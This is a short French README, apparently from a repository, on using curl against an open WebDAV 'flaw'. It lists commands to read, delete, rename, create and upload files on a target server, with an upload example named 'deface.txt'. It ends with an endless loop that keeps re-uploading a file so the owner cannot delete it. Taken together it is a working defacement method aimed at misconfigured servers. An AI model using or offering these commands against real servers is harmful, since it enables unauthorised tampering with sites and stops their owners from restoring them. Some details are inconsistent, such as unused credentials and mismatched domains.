# Utilisation des commandes Curl avec une faille Webdav

Curl est un outil de ligne de commande pour effectuer toutes sortes de manipulations et de transferts d'URL, mais ce repositorie particulier se concentrera sur la façon d'utiliser curl pour gérer (lire/supprimer/renommer/télécharger) des fichiers sur un serveur webdav.

Supposons que nous ayons les données suivantes :

URL Webdav : https://example.com/webdav
Username : user
Password : pass

## Lecture de fichiers/dossiers sur le serveur Webdav :

> La lecture de fichiers ou de dossiers sur Webdav Server est simplement la mise en œuvre de la requête Curl . Ainsi, la commande serait:
```shell
curl 'https://example.com/webdav'
```

## Suppression de fichiers/dossiers sur le serveur Webdav :

> Pour supprimer un fichier ou un dossier existant sur le serveur Webdav, nous devons envoyer une requête DELETE suivie du chemin d'accès au dossier/fichier du serveur Webdav. Disons que nous devons supprimer le dossier de test sur le serveur webdav, donc notre commande serait :
```shell
curl -X DELETE 'https://example.com/webdav/test'
```
> Similarly for deleting file say test.html:
```shell
curl -X DELETE 'https://example.com/webdav/test.html'
```

## Renommer des fichiers sur un serveur webdav :
> L'opération de renommage peut être effectuée à l'aide de la requête -X MOVE. Disons que nous voulons renommer old.txt en new.txt :
```shell
curl -X MOVE --header 'Destination:http://example.org/new.txt' 'https://example.com/old.txt'
```

## Création d'un nouveau dossier sur le serveur Webdav :
> Pour créer un nouveau répertoire sur le serveur webdav, utilisez la requête -X MKCOL :
```shell
curl -X MKCOL 'https://exemple.com/new_folder'
```

## Télécharger le fichier sur le serveur Webdav :
> Pour télécharger un fichier sur le serveur webdav, utilisez la requête PUT. Disons que le fichier src est /path/to/local/deface.txt et que nous voulons le télécharger dans le dossier de test sur le serveur webdav, donc notre commande serait :
```shell
curl -T '/path/to/local/deface.txt' 'https://example.com/test/'
```

## Faire une boucle pour bloquer le fichier :
> Donc ceci permet de bloquer un curl -X DELETE, en effet il télecharge à l'infini le fichier sur le serveur webdav donc voici ce qui faut faire:
```sh
while true; do curl -T 'fichier.html' 'https://example.com' ; done
```


